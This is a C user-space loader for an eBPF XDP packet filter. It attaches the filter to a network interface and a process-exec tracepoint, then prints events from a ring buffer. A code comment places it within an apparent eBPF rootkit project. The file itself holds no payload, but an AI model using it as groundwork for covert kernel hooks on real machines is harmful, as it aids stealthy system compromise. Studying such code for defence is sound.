#include <argp.h>
#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <linux/if_link.h>
#include <net/if.h>
#include <unistd.h>

#include <bpf/bpf.h>

#include "xdp_filter.skel.h"

#include "include/xdp_filter.h"
#include "../common/constants.h"
#include "../common/map_defs.h"
#include "include/utils/files/path.h"
#include "include/utils/strings/regex.h"
#include "include/utils/structures/fdlist.h"

static struct env {
	bool verbose;
} env;

void print_help_dialog(const char* arg){
	
    printf("\nUsage: %s ./xdp_filter OPTION\n\n", arg);
    printf("Program OPTIONs\n");
    char* line = "-t[NETWORK INTERFACE]";
    char* desc = "Activate XDP filter";
    printf("\t%-40s %-50s\n\n", line, desc);
	line = "-v";
    desc = "Verbose mode";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-h";
    desc = "Print this help";
    printf("\t%-40s %-50s\n\n", line, desc);

}

/*Wrapper for printing into stderr when debug active*/
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args){
	if (level == LIBBPF_DEBUG && !env.verbose)
		return 0;
	return vfprintf(stderr, format, args);
}

/**
* Increases kernel internal memory limit
* necessary to allocate resouces like BPF maps.
*/
static void bump_memlock_rlimit(void){
	struct rlimit rlim_new = {
		.rlim_cur	= RLIM_INFINITY,
		.rlim_max	= RLIM_INFINITY,
	};

	if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
		fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit!\n");
		exit(1);
	}
}

static volatile bool exiting = false;

static void sig_handler(int sig){
	exiting = true;
}

/**
 * @brief Manages an event received via the ring buffer
 * It's a message from th ebpf program
 * 
 * @param ctx 
 * @param data 
 * @param data_sz 
 * @return int 
 */
static int handle_rb_event(void *ctx, void *data, size_t data_size){
	const struct rb_event *e = data;

	//For time displaying
	struct tm *tm;
	char ts[32];
	time_t t;
	time(&t);
	tm = localtime(&t);
	strftime(ts, sizeof(ts), "%H:%M:%S", tm);


    if(e->event_type == INFO){
		printf("%s INFO  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
	}else if(e->event_type == DEBUG){

	}else if(e->event_type == ERROR){

	}else if(e->event_type == EXIT){

	}else{
		printf("UNRECOGNIZED RB EVENT RECEIVED");
		return -1;
	}

	return 0;
}


int main(int argc, char**argv){
    struct ring_buffer *rb = NULL;
    struct xdp_filter_bpf *skel;
    __u32 err;

	//Ready to be used
	/*for (int arg = 1; arg < argc; arg++) {
		if (load_fd_kmsg(argv[arg])) {
			fprintf(stderr, "%s.\n", strerror(errno));
			return EXIT_FAILURE;
		}
	}*/
	
	__u32 ifindex; 

	/* Parse command line arguments */
	int opt;
	while ((opt = getopt(argc, argv, ":t:vh")) != -1) {
        switch (opt) {
        case 't':
            ifindex = if_nametoindex(optarg);
            printf("Activating filter on network interface: %s\n", optarg);
            if(ifindex == 0){
				perror("Error on input interface");
				exit(EXIT_FAILURE);
			}
			break;
		case 'v':
			//Verbose output
			env.verbose = true;
			break;

        case 'h':
            print_help_dialog(argv[0]);
            exit(0);
            break;
        case '?':
            printf("Unknown option: %c\n", optopt);
			exit(EXIT_FAILURE);
            break;
        case ':':
            printf("Missing arguments for %c\n", optopt);
            exit(EXIT_FAILURE);
            break;
        
        default:
            print_help_dialog(argv[0]);
            exit(EXIT_FAILURE);
        }
    }
	
	//Set up libbpf errors and debug info callback
	libbpf_set_print(libbpf_print_fn);

	// Bump RLIMIT_MEMLOCK to be able to create BPF maps
	bump_memlock_rlimit();

	//Cleaner handling of Ctrl-C
	signal(SIGINT, sig_handler);
	signal(SIGTERM, sig_handler);

    //Open and create BPF application in the kernel
	skel = xdp_filter_bpf__open();
	if (!skel) {
		fprintf(stderr, "Failed to open and load BPF skeleton\n");
		return 1;
	}

	//Load & verify BPF program
	err = xdp_filter_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}


	//Attack BPF program to network interface
	//New way of doing it: it allows for future addition of multiple 
	//XDP programs attached to same interface if needed
	//Also done this way to modularize attaching the different tracepoints
	//of the rootkit
	/** @ref Test suite by readhat ebpf devs on XDP
	 *  https://git.zx2c4.com/linux/plain/tools/testing/selftests/bpf/prog_tests/xdp_link.c 
	 */
	struct bpf_prog_info prog_info;
	__u32 bpf_prog_info_size = sizeof(prog_info);
	__u32 xdp_prog_fd = bpf_program__fd(skel->progs.xdp_receive);
	__u32 xdp_prog_id_old = 0;
	__u32 xdp_prog_id_new;
	DECLARE_LIBBPF_OPTS(bpf_xdp_set_link_opts, opts, .old_fd = -1);
	int flags = XDP_FLAGS_REPLACE;
	
	memset(&prog_info, 0, bpf_prog_info_size);
	err = bpf_obj_get_info_by_fd(xdp_prog_fd, &prog_info, &bpf_prog_info_size);
	if(err<0){
		fprintf(stderr, "Failed to setup xdp link\n");
		goto cleanup;
	}
	xdp_prog_id_new = prog_info.id;
	
	//Check whether there exists previously loaded XDP program
	err = bpf_get_link_xdp_id(ifindex, &xdp_prog_id_old, 0);
	if(err<0 || (xdp_prog_id_old!=0 && xdp_prog_id_old!=xdp_prog_id_new)){
		fprintf(stderr, "Xdp program found id--> old:%u != new:%u\n", xdp_prog_id_old, xdp_prog_id_new);
		fprintf(stderr,"This should not happen, since our xdp program is removed automatically between calls\nRun `ip link set dev lo xdpgeneric off` to detach whichever program is running");
		//TODO automatically force the reattach
		goto cleanup;
	}

    // Attach loaded xdp program
	skel->links.xdp_receive = bpf_program__attach_xdp(skel->progs.xdp_receive, ifindex);
	err = libbpf_get_error(skel->links.xdp_receive);
	if (err) {
		fprintf(stderr, "Failed to attach BPF skeleton\n");
		goto cleanup;
	}

	//Attach sched module (testing)
	skel->links.handle_sched_process_exec = bpf_program__attach(skel->progs.handle_sched_process_exec);
	err = libbpf_get_error(skel->links.handle_sched_process_exec);
	if (err<0) {
		fprintf(stderr, "Failed to attach sched module\n");
		goto cleanup;
	}
	

	// Set up ring buffer polling --> Main communication buffer kernel->user
	rb = ring_buffer__new(bpf_map__fd(skel->maps.rb_comm), handle_rb_event, NULL, NULL);
	if (rb==NULL) {
		err = -1;
		fprintf(stderr, "Failed to create ring buffer\n");
		goto cleanup;
	}

	//Now wait for messages from ebpf program
	printf("Filter set and ready\n");
	while (!exiting) {
		err = ring_buffer__poll(rb, 100 /* timeout, ms */);
		
		//Checking if a signal occured
		if (err == -EINTR) {
			err = 0;
			break;
		}
		if (err < 0) {
			printf("Error polling ring buffer: %d\n", err);
			break;
		}
	}

	//Received signal to stop, detach program from network interface
	__u32 fd = -1;
    err = bpf_set_link_xdp_fd(ifindex, fd, flags);


    cleanup:
		ring_buffer__free(rb);
        xdp_filter_bpf__destroy(skel);

        return err < 0 ? -err : 0;

    return 0;
}